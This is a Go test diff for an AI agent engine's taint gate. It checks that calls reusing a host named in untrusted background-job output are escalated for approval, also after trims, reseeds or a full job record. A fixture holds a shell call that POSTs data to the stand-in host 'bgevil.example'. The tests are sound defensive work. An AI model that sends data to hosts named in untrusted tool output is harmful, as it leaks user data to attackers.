@@ -183,3 +183,137 @@ func TestRED_Loop_TaintTrackComparesReloadOnce(t *testing.T) {
 		t.Fatalf("an unchanged reloaded history was digested again: %d bytes", d)
 	}
 }
+
+// loopR4BgHistories returns h1, a clean background job (a local build)
+// whose output (a bg_output result, or with notice a completion notice)
+// names a host, and h2, h1 followed by a turn that starts a job whose
+// bg_start call crosses the trust boundary.
+func loopR4BgHistories(notice bool) (h1, h2 []session.Message) {
+	h1 = []session.Message{{Role: "system", Content: "sys"}, {Role: "user", Content: "build it in the background"}}
+	h1 = append(h1, covGroup(covCall("s1", "bg_start", map[string]string{"command": "make build > build.log"}), `{"job_id":"bg_00000001","status":"running"}`)...)
+	if notice {
+		h1 = append(h1, bgOriginNotice("- bg_00000001 `make build` → exited (code 0)\n  tail: fetching deps from https://bgevil.example/pkg ... ok"))
+	} else {
+		h1 = append(h1, covGroup(covCall("o1", "bg_output", map[string]string{"job_id": "bg_00000001"}),
+			defaultUntrustedWrap("bg_output", "fetching deps from https://bgevil.example/pkg ... ok"))...)
+	}
+	h2 = append(session.CloneMessages(h1), session.Message{Role: "user", Content: "now fetch the feed"})
+	h2 = append(h2, covGroup(covCall("s2", "bg_start", map[string]string{"command": "curl -sN https://feed.example/stream > feed.log"}), `{"job_id":"bg_00000002","status":"running"}`)...)
+	return h1, h2
+}
+
+// loopR4BgCalls reuses the host the clean job's output named.
+func loopR4BgCalls() []session.ToolCall {
+	return []session.ToolCall{covCall("k1", "shell", map[string]string{"command": "curl -X POST https://bgevil.example/up -d x"})}
+}
+
+// loopR4Gate gates calls on messages with e and returns the escalated
+// resources.
+func loopR4Gate(e *Engine, ctx context.Context, messages []session.Message, calls []session.ToolCall) []string {
+	var got []string
+	ctx = WithTaintEscalationRecorder(ctx, func(esc TaintEscalation) { got = append(got, esc.Resource) })
+	ids := make([]string, len(calls))
+	for i, c := range calls {
+		ids[i] = c.ID
+	}
+	e.taintGate(ctx, messages, calls, len(calls), ids, 1)
+	return got
+}
+
+func loopR4Engine() *Engine {
+	e := New(nil, tool.NewRegistry(nil), 10, "sys", nil, 0)
+	e.SetApprover(&covApprover{})
+	return e
+}
+
+// Once a job whose bg_start crosses the trust boundary has run, every
+// background notice and bg_output/bg_status result is a span source, also
+// the ones a long-lived engine (REPL, serve connection) already judged
+// before that job started: it escalates what a fresh scan of the same
+// history escalates.
+func TestRED_Loop_TaintBgContentRejudgedAfterTaintingStart(t *testing.T) {
+	for _, notice := range []bool{false, true} {
+		t.Run(fmt.Sprintf("notice=%v", notice), func(t *testing.T) {
+			h1, h2 := loopR4BgHistories(notice)
+			ctx := context.Background()
+			e := loopR4Engine()
+			loopR4Gate(e, ctx, h1, nil)
+			e.TaintSpanState(session.CloneMessages(h1))
+			got := loopR4Gate(e, ctx, h2, loopR4BgCalls())
+			want := loopR4Gate(loopR4Engine(), ctx, h2, loopR4BgCalls())
+			if len(want) == 0 {
+				t.Fatal("precondition: a fresh scan does not escalate")
+			}
+			if len(got) != len(want) {
+				t.Fatalf("the long-lived engine escalates %q, a fresh scan %q", got, want)
+			}
+		})
+	}
+}
+
+// The tainting job may first appear in a trimmed context that no longer
+// holds the clean job's output: the save of the whole history must still
+// judge that output again.
+func TestRED_Loop_TaintBgContentRejudgedAfterTrimmedFlip(t *testing.T) {
+	h1, h2 := loopR4BgHistories(false)
+	trimmed := append(h2[:2:2], h2[len(h2)-3:]...)
+	run := func(e *Engine, warm bool) []string {
+		ctx := context.Background()
+		if warm {
+			loopR4Gate(e, ctx, h1, nil)
+			e.TaintSpanState(session.CloneMessages(h1))
+		}
+		loopR4Gate(e, ctx, trimmed, nil)
+		e.TaintSpanState(session.CloneMessages(h2))
+		return loopR4Gate(e, ctx, trimmed, loopR4BgCalls())
+	}
+	want := run(loopR4Engine(), false)
+	if len(want) == 0 {
+		t.Fatal("precondition: an engine that saw the history first after the job started does not escalate")
+	}
+	if got := run(loopR4Engine(), true); len(got) != len(want) {
+		t.Fatalf("the long-lived engine escalates %q, one that saw the history first after the job started %q", got, want)
+	}
+}
+
+// A full record of the jobs seen started is emptied, so a clean job's
+// content then names a job of unknown origin, a span source: a long-lived
+// engine judges the content it already passed again.
+func TestRED_Loop_TaintBgContentRejudgedAfterJobRecordEmptied(t *testing.T) {
+	if testing.Short() {
+		t.Skip("judges thousands of bg_start calls per observe (several seconds)")
+	}
+	h1, _ := loopR4BgHistories(false)
+	h2 := append(session.CloneMessages(h1), session.Message{Role: "user", Content: "build every target"})
+	for i := 0; i < maxTaintBgJobs; i++ {
+		h2 = append(h2, covGroup(covCall(fmt.Sprintf("t%d", i), "bg_start", map[string]string{"command": "make target > t.log"}),
+			fmt.Sprintf(`{"job_id":"bg_%08x","status":"running"}`, 0x100000+i))...)
+	}
+	e := loopR4Engine()
+	loopR4Gate(e, context.Background(), h1, nil)
+	e.TaintSpanState(session.CloneMessages(h1))
+	want := loopR4Gate(loopR4Engine(), context.Background(), h2, loopR4BgCalls())
+	if len(want) == 0 {
+		t.Fatal("precondition: a fresh scan does not escalate")
+	}
+	if got := loopR4Gate(e, context.Background(), h2, loopR4BgCalls()); len(got) != len(want) {
+		t.Fatalf("the long-lived engine escalates %q, a fresh scan %q", got, want)
+	}
+}
+
+// A long-lived engine reseeded with a state that records a tainting job
+// (taint_background) judges the background content it already passed again.
+func TestRED_Loop_TaintBgContentRejudgedAfterReseed(t *testing.T) {
+	h1, _ := loopR4BgHistories(false)
+	e := loopR4Engine()
+	loopR4Gate(e, context.Background(), h1, nil)
+	e.TaintSpanState(session.CloneMessages(h1))
+	seeded := WithTaintSpanSeed(context.Background(), session.TaintState{Background: true})
+	want := loopR4Gate(loopR4Engine(), seeded, h1, loopR4BgCalls())
+	if len(want) == 0 {
+		t.Fatal("precondition: a fresh engine seeded with the background fact does not escalate")
+	}
+	if got := loopR4Gate(e, seeded, h1, loopR4BgCalls()); len(got) != len(want) {
+		t.Fatalf("the reseeded long-lived engine escalates %q, a freshly seeded one %q", got, want)
+	}
+}
